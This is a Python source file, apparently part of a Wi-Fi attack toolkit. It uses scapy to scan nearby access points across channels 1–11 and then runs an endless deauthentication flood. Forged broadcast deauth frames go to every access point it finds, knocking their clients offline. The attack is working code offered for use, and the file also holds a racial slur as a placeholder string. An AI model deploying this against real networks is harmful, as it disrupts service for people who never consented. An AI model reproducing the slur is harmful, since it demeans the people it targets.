import subprocess
from scapy.all import *
from threading import Thread
from src import wificardtools as wificard

#colors
red = "\033[31m"
green = "\033[32m"
yellow = "\033[33m"
blue = "\033[34m"
purple = "\033[35m"
clear = "\033[00m"

#ap array
AP_BSSID = []
AP_SSID = []
AP_CH = []

APINFOLOG = "{c}{pa2}  {p}|{c}  {pi}  {p}"

channels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]

#used for the entire chunk of sniffing, holds all below functions together in a nice orderly fashion

def mainsniffer():    
    print('''
        {b}NETWORK DEVICES SCANNED{c}
{p}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~{c}
        {b}BSSID{c}     {p} |       {b}SSID{c}'''.format(b=blue, p=purple, c=clear))
    
    channel_hopping_sniffer()
    
#essentially main sniffing program that runs for one cycle capturing any packet across 11 channels, add 3 more to the channels array if you want a wider range, ive come to learn that 12 13 14 barely gets used so i did not include them. i want speed over potential

def channel_hopping_sniffer():
    global channels
    #sniffs ONE CYCLE on each channel from 1 to 11
    for channel in channels:
        #formatting thing to look good
        if channel < 10:
            print("{b}CHANNEL{p} ".format(b=blue, p=purple) + str(channel) + (" "*10) + "|{c}".format(c=clear))
        else:
            print("{b}CHANNEL{p} ".format(b=blue, p=purple) + str(channel) + (" "*9) + "|{c}".format(c=clear))
        
        sniff(iface="mon0", prn=pkt_callback, timeout=0.5)
        subprocess.check_output("iwconfig mon0 channel " + str(channel), shell=True)
        
    print("\n---------------------------------------\n{b}SCANNED {p}NETWORK{b} DEVICES: {c}{num}\n{b}ON {c}11 {p}CHANNELS{c}.\n---------------------------------------\n".format(num=str(len(AP_BSSID)), b=blue, c=clear, p=purple))
    
#function that basically determines what happens with captured packets, pretty readable i think

def pkt_callback(pkt):
    if pkt.haslayer(Dot11Elt):
        if pkt.addr2 not in AP_BSSID and pkt.info not in AP_SSID:
            AP_BSSID.append(pkt.addr2)
            AP_SSID.append(pkt.info)
            print(APINFOLOG.format(c=clear, p=purple, pa2=pkt.addr2, pi=pkt.info, chan="niga"))    

#ATTACKS

#finally done, broadcasts deauth packets to all scanned aps forever whilst also channel hopping
def deauth_attack():
    BROADCAST = "FF:FF:FF:FF:FF:FF"
    
    verboselog = False
    is_verbose = input("VERBOSE? (y/n) ")
    
    if is_verbose == "y":
        verboselog=True
    else:
        verboselog=False
        
    chop = Thread(target=wificard.channelhopper, args=[]) #channel hopping daemon
    chop.daemon = True
    chop.start()
    
    input("BEGIN NETWORK DOS DEAUTH ATTACK?\nPRESS [ENTER]...")
    
    if verboselog==False:
        print("SENDING DEAUTH PACKETS...")
    
    while True:    
        for bssid in AP_BSSID:
            pkt = RadioTap() / Dot11(addr1=BROADCAST, addr2=bssid, addr3=bssid) / Dot11Deauth()
            sendp(pkt, iface="mon0", count=10, verbose=False)
            if verboselog == True:
                print("packet sent to " + bssid)
